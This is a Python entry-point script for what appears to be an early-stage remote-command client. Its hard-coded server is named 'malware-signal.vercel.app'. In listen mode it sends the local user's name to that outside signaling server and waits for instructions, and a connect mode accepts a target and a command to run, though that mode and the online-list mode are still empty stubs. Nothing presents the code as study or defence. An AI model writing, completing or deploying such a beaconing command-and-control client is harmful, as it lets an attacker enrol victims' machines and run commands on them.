# main.py
import asyncio
import uuid
import getpass

import sys
import helper as h
import version as v

from signaling.signal import SignalClient



HOST = "https://malware-signal.vercel.app/"
ROOM = "D4RKGLI7CH"

# user_id = uuid.uuid4()
username = getpass.getuser()


async def listen_mode():
    print("[+]listen mode")

    signal = SignalClient(ROOM, username, HOST)

    await signal.connect()

    print(f"[+] Listening as {username}")

    while True:
        await asyncio.sleep(1)


def online_list_mode():
    print("online list mode")

def connect_mode(target, command):
    print("connect mode")


def main():
    try:
        if len(sys.argv) < 2:
            h.help()
            return

        if sys.argv[1] in ("-h", "--help"):
            h.help()

        elif sys.argv[1] in ("-v", "--version"):
            print(v.version())

        elif sys.argv[1] == "-l":
            if len(sys.argv) != 2:
                h.help()
                return
            asyncio.run(listen_mode())

        elif sys.argv[1] == "-ol":
            if len(sys.argv) != 2:
                h.help()
                return
            online_list_mode()

        elif sys.argv[1] == "-c":
            if len(sys.argv) != 4:
                h.help()
                return

            target = sys.argv[2]
            command = sys.argv[3]
            connect_mode(target, command)

        else:
            h.help()
    except KeyboardInterrupt:
        print("[+] Connection Closed")

if __name__ == "__main__":
    main()
















